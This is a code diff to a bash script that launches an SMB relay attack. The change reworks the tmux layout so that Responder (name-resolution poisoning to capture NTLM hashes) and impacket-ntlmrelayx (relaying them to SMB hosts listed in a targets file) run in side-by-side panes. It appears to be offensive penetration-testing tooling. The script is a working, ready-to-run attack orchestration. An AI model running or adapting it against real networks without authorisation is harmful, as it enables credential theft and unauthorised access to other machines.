@@ -308,17 +308,18 @@ restore_config() {
     printf '[+] Responder configuration restored and verified.\n'
 }
 
-# Function to start or attach to a tmux session and initialize windows
-start_tmux_window() {
-    local session_name=$1
-    local window_name=$2
-    local command=$3
-    
-    # Create the window in the tmux session
-    tmux new-window -t "$session_name" -n "$window_name" -c "$RUN_DIR" || return 1
-    
-    # Send the command to the new tmux window
-    tmux send-keys -t "$session_name:$window_name" "$command" C-m
+# Capture pane IDs so custom tmux base indexes do not affect targeting.
+prepare_tmux_layout() {
+    RESPONDER_PANE=$(tmux new-session -d -s "$SESSION_NAME" -n tools \
+        -c "$RUN_DIR" -P -F '#{pane_id}') || return 1
+    RELAY_PANE=$(tmux split-window -h -t "$RESPONDER_PANE" \
+        -c "$RUN_DIR" -P -F '#{pane_id}') || return 1
+    tmux select-layout -t "$RESPONDER_PANE" even-horizontal || return 1
+    tmux select-pane -t "$RESPONDER_PANE" -T Responder || return 1
+    tmux select-pane -t "$RELAY_PANE" -T ntlmrelayx || return 1
+    tmux set-option -w -t "$RESPONDER_PANE" pane-border-status top || return 1
+    tmux set-option -w -t "$RESPONDER_PANE" pane-border-format '#{pane_title}' || return 1
+    tmux select-pane -t "$RESPONDER_PANE"
 }
 
 # Function to execute SMB relay attack in tmux
@@ -327,14 +328,12 @@ run_smb_relay_attack() {
     SESSION_ATTEMPTED=true
     echo -e "${BLUE}[*] Starting SMB Relay Attack...${RESET}" | tee -a "$RUN_DIR/attack.log" || return 1
 
-    if ! tmux has-session -t "$SESSION_NAME" 2>/dev/null; then
-        echo -e "${GREEN}[+] Creating tmux session: $SESSION_NAME.${RESET}"
-        tmux new-session -d -s "$SESSION_NAME" -c "$RUN_DIR" || return 1
-    fi
+    echo -e "${GREEN}[+] Creating side-by-side tmux panes: $SESSION_NAME.${RESET}"
+    prepare_tmux_layout || return 1
 
     echo -e "${CYAN}Starting Responder on interface $network_interface...${RESET}"
-    start_tmux_window "$SESSION_NAME" "responder" \
-        "responder -I $network_interface 2>&1 | tee -a responder_$(date +%s).log" || return 1
+    tmux send-keys -t "$RESPONDER_PANE" \
+        "responder -I $network_interface 2>&1 | tee -a responder_$(date +%s).log" C-m || return 1
 
     # The pane starts in RUN_DIR, so use the fixed filename without shell interpolation.
     relay_command="impacket-ntlmrelayx -smb2support -tf vulnerable_smb_targets.txt"
@@ -347,7 +346,7 @@ run_smb_relay_attack() {
     relay_command+=" 2>&1 | tee -a relay_$(date +%s).log"
 
     echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
-    start_tmux_window "$SESSION_NAME" "ntlmrelayx" "$relay_command" || return 1
+    tmux send-keys -t "$RELAY_PANE" "$relay_command" C-m || return 1
 
     log 'Attaching to tmux. Detach leaves processes running; use -k to stop and -r to restore configuration.' || return 1
     release_lock || return 1
